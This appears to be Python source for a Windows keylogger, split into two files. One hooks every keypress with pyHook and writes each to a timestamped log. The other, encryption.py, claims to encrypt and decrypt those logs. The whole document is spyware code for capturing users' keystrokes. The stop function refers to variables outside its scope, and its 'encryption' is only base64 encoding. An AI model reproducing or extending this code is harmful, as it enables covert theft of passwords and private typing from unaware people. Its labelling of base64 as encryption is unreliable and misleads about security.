import pyHook
import pythoncom
import os
import datetime

# start the logging process
def start_logging():
    # create log file file of the user input
    log_file_name = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".log"
    log_file_path = os.path.join(os.getcwd(), log_file_name)
    log_file = open(log_file_path, 'w')
    
    # define the function for keyspressed
    def OnKeyboardEvent(event):
        log_file.write("Key: " + chr(event.Ascii) + " | Code: " + str(event.Ascii) + "\n")
    
    # create a hook manager object
    hook_manager = pyHook.HookManager()
    # listen for every keyboard input
    hook_manager.KeyDown = OnKeyboardEvent
    # set  hook
    hook_manager.HookKeyboard()
    # wait 
    pythoncom.PumpMessages()

# stop logging
def stop_logging():
    # remove  hook
    hook_manager.UnhookKeyboard()
    # close the created log file
    log_file.close()

encryption.py

import base64

# encrypt the logs 
def encrypt_log(log_file_path):
    # read the logs
    log_file = open(log_file_path, 'rb')
    data = log_file.read()
    # encrypt the log data 
    encrypted_data = base64.b64encode(data)
    # save the encrypted log files
    encrypted_file = open(log_file_path + ".enc", 'wb')
    encrypted_file.write(encrypted_data)
    encrypted_file.close()

# decrypt the created logs 
def decrypt_log(log_file_path):
    # read the decrypted log
    encrypted_file = open(log_file_path, 'rb')
    encrypted_data = encrypted_file.read()
    # decrypt the logs
    decrypted_data = base64.b64decode(encrypted_data)
    # display the decrypted log file to the console
    print(decrypted_data)



